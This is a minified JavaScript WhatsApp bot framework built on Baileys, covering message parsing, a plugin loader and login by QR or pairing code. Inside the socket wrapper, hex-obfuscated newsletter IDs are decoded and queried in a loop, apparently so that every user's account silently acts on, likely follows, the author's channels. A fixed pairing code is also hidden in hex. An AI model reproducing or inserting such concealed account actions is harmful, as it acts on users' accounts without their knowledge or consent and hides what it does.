...
import { dirname, resolve, isAbsolute, join, relative } from "path";
import { watch } from "chokidar";
import { existsSync } from "fs";
import ke from "axios";
import { AsyncLocalStorage } from "async_hooks";
import Fe from "qrcode-terminal";
var he = z$1.object({ img: z$1.union([z$1.string().url(), z$1.instanceof(Buffer)]).optional(), title: z$1.string().optional(), body: z$1.string().optional(), mentions: z$1.array(z$1.string()).optional(), big: z$1.boolean().optional(), newsletterName: z$1.string().optional(), newsletterJid: z$1.string().optional() }), ye = z$1.record(z$1.string(), z$1.any()), we = z$1.object({ name: z$1.enum(["quick_reply", "cta_url", "cta_call", "cta_copy", "single_select", "call_permission_request"]), params: ye }), be = z$1.object({ buttons_limits: z$1.number(), list_title: z$1.string(), button_title: z$1.string(), canonical_url: z$1.string().url() }), ve = z$1.object({ imageUrl: z$1.string().url().optional(), bodyText: z$1.string().optional(), footerText: z$1.string().optional(), buttons: z$1.array(we), key_btn: be.optional(), mentions: z$1.array(z$1.string()).optional(), newsletterName: z$1.string().optional(), newsletterJid: z$1.string().optional() });
async function j(t) {
...
END:VCARD` }] } }, { quoted: s });
    ...
    let e = ["313230333633343039353237343739323233406e6577736c6574746572", "313230333633323235333536383334303434406e6577736c6574746572", "313120333633333736303131353533313039406e6577736c6574746572", "313230333633333736303131353533313039406e6577736c6574746572"];
    for (let n of e) await t.query({ tag: "iq", attrs: { id: randomUUID().replace(/-/g, ""), type: "get", xmlns: "w:mex", to: "@s.whatsapp.net" }, content: [{ tag: "query", attrs: { query_id: "7871414976211147" }, content: new TextEncoder().encode(JSON.stringify({ variables: { newsletter_id: await Buffer.from(n, "hex").toString() } })) }] });
  }, t;
}
var B = proto.WebMessageInfo;
z$1.object({ jid: z$1.string().optional(), lid: z$1.string().optional(), name: z$1.string().optional() });
z$1.object({ id: z$1.string().nullable().optional(), participants: z$1.array(z$1.object({ id: z$1.string().optional(), admin: z$1.enum(["admin", "superadmin"]).nullable().optional(), phoneNumber: z$1.string().optional() })) });
var F = async (t, e, n, o) => {
  ...
  let c = !!l && l !== r, v = c ? l : r, y = t.key?.fromMe ? jidNormalizedUser(e.user.id) : jidNormalizedUser(t.key?.participant || t.key?.remoteJid || ""), p = t.key?.remoteJid || "", x = p.endsWith("@g.us"), A = n?.some((u) => {
    if (!u) return false;
  ...
  let R = { id: t.key?.id ?? void 0, body: v, text: r, from: p, name: t.pushName || "Unknown", timestamp: new Date((t.messageTimestamp || 0) * 1e3), isGroup: x, isOwner: A, isAdmin: M, isBotAdmin: I, fromMe: t.key?.fromMe || false, raw: t, chat: p, sender: y, pushName: t.pushName ?? void 0, key: t.key, message: t.message, reply: async (u, m) => {
    ...
    try {
      ...
      let u = getContentType(t.message);
      if (!u) return null;
      let m = t.message[u];
      if (!m) return null;
      let g = u.replace("Message", ""), E = await downloadContentFromMessage(m, g), h = Buffer.from([]);
  ...
  if (t.message) {
    ...
    if (i.mediaType = i.mtype?.replace("Message", ""), i.isMedia = ["imageMessage", "videoMessage", "audioMessage", "documentMessage", "stickerMessage"].includes(i.mtype || ""), i.isMedia && i.msg && (i.mimetype = i.msg.mimetype || null, i.fileSize = i.msg.fileLength || 0, i.fileName = i.msg.fileName || null, i.url = i.msg.url || null, i.directPath = i.msg.directPath || null, i.mediaKey = i.msg.mediaKey || null, i.caption = i.msg.caption || null), (i.mtype === "imageMessage" || i.mtype === "videoMessage" || i.mtype === "stickerMessage") && (i.width = i.msg.width || null, i.height = i.msg.height || null), (i.mtype === "videoMessage" || i.mtype === "audioMessage") && (i.duration = i.msg.seconds || i.msg.duration || null), i.isViewOnce = i.mtype === "viewOnceMessage" || i.mtype === "viewOnceMessageV2" || i.msg?.viewOnce === true, i.isForwarded = i.msg?.contextInfo?.isForwarded || false, i.forwardingScore = i.msg?.contextInfo?.forwardingScore || 0, i.msg?.contextInfo?.quotedMessage?.protocolMessage?.type === 0 && (i.isEdited = true, i.editVersion = i.msg.contextInfo.quotedMessage.protocolMessage.editVersion || 0), i.mentionedJid = i.msg?.contextInfo?.mentionedJid || [], i.msg?.contextInfo?.quotedMessage) {
      ...
      E && g && (h.mimetype = g.mimetype || null, h.fileSize = g.fileLength || 0, h.fileName = g.fileName || null, h.width = g.width || null, h.height = g.height || null, h.duration = g.seconds || g.duration || null, h.url = g.url || null, h.directPath = g.directPath || null, h.mediaKey = g.mediaKey || null, h.thumbnailUrl = g.thumbnailDirectPath || null), h.fakeObj = () => {
        ...
        try {
          if (!g || !m) return null;
          let C = m.replace("Message", ""), w = await downloadContentFromMessage(g, C), q = Buffer.from([]);
  ...
  return i.sendRead = async () => {
    ...
    try {
      if (m || !t.message || getContentType(t.message) === "conversation") return e.sendMessage(u, { forward: t, ...g });
      let E = generateWAMessageFromContent(u, t.message, { ...g, userJid: e.user.id });
...
var ae = { red: "\x1B[31m", green: "\x1B[32m", yellow: "\x1B[33m", blue: "\x1B[34m", gray: "\x1B[90m", magenta: "\x1B[35m", cyan: "\x1B[36m", white: "\x1B[37m", bgRed: "\x1B[41m", bgGreen: "\x1B[42m", bgYellow: "\x1B[43m", bgBlue: "\x1B[44m", bgMagenta: "\x1B[45m", bgCyan: "\x1B[46m" }, b = (t, e) => `${ae[e] + t}\x1B[0m`, ie = (t) => {
  let e = ["red", "yellow", "green", "cyan", "blue", "magenta"];
...
var Ge = fileURLToPath(import.meta.url), de = dirname(Ge), G = { basic: ["command", "name", "description", "aliases", "category", "usage"], restrictions: ["owner", "group", "private", "botAdmin", "admin"], settings: ["cooldown", "disabled", "usePrefix"], hooks: ["before", "after"] }, O = [...G.basic, ...G.restrictions, ...G.settings, ...G.hooks], me = ["js", "ts", "mjs", "cjs"], qe = new AsyncLocalStorage(), J = class {
  constructor(e = 36e5) {
  ...
  findByFile(e) {
    let n = resolve(e), o = this.fileIndex.get(n);
  ...
  start(e) {
    ...
    if (this.watchedPath = n, !existsSync(n)) {
      d.error(`[${(/* @__PURE__ */ new Date()).toLocaleTimeString()}] Path does not exist: ${n}`);
      return;
    }
    let o = this.getWatchConfig();
    this.watcher = watch(n, { ignored: [/(^|[\/\\])\../, /node_modules/, /\.git/], persistent: true, ignoreInitial: true, depth: 99, ...o }), this.setupWatcherEvents();
  }
  stop() {
  ...
  resolvePath(e) {
    ...
    let n = [resolve(process.cwd(), e), resolve(de, e), resolve(process.cwd(), "node_modules", e)];
    for (let o of n) if (existsSync(o)) return o;
    return resolve(process.cwd(), e);
  }
  getWatchConfig() {
  ...
  getRelativePath(e) {
    try {
      return relative(this.watchedPath, e);
    } catch {
      return e;
    }
  }
  ...
  async loadFile(e) {
    try {
      let n = resolve(e), o = await this.isESMFile(n), s = await this.importModule(n, o);
  ...
  async importModule(e, n) {
    if (n) {
      let s = await import(`${pathToFileURL(e).href}?t=${Date.now()}`);
      return s.default ?? s;
    } else try {
  ...
  async loadDirectory(e) {
    ...
    let o = async (s) => {
      try {
        let r = await readdir(s, { withFileTypes: true });
        for (let l of r) {
          let c = join(s, l.name);
  ...
  unloadFile(e) {
    ...
    this.registry.unregisterByFile(n), this.loadedPaths.delete(n), this.beforeHandlers = this.beforeHandlers.filter((o) => {
      let s = o.__filePath;
      return !s || resolve(s) !== n;
    });
  }
  resolvePath(e) {
    if (isAbsolute(e)) return e;
    let n = [resolve(process.cwd(), e), resolve(de, e)];
    for (let o of n) if (existsSync(o)) return o;
    return resolve(process.cwd(), e);
  }
  clearCooldowns(e) {
...
var Ue = async (t, e) => {
  try {
    t.sock.ev.on("connection.update", (n) => {
      ...
      if (r && v && c && (d.line(), d.done("Scan QR code to login ↓"), Fe.generate(r, { small: true }), d.line()), o === "close") {
...
var pe = class {
  ...
  async start(e = false) {
    ...
    try {
      await oe(this);
      let { version: n } = await fetchLatestBaileysVersion(), { state: o, saveCreds: s } = await useMultiFileAuthState(this.config.sessionPath);
      this.credsSaver = s;
      ...
      r && !this.config.printQR && this.config.showLogs && this.config.phoneNumber && (d.done("New session - Waiting for pairing..."), d.info(`Phone number: ${this.config.phoneNumber}`), setTimeout(async () => {
        try {
          if (this.sock) {
            let l = await this.sock.requestPairingCode(this.config.phoneNumber, Buffer.from("56454e4931323334", "hex").toString());
            console.log(`🔐 Pairing Code ${b(l, "yellow")}`), d.line();
          }
        } catch (l) {
          d.error(`Pairing error: ${l.message}`);
        }
      }, 2e3)), this.sockBaileys = makeWASocket({ version: n, auth: o, logger: Ye({ level: "silent" }), browser: Browsers.ubuntu(this.config.browser), printQRInTerminal: r && this.config.printQR, markOnlineOnConnect: this.config.markOnline, syncFullHistory: this.config.syncHistory, generateHighQualityLinkPreview: this.config.linkPreview }), this.sockBaileys && (this.sock = await j(this.sockBaileys), this.setupEvents(s, r)), this.isRunning = true, this.reconnectAttempts = 0;
    } catch (n) {
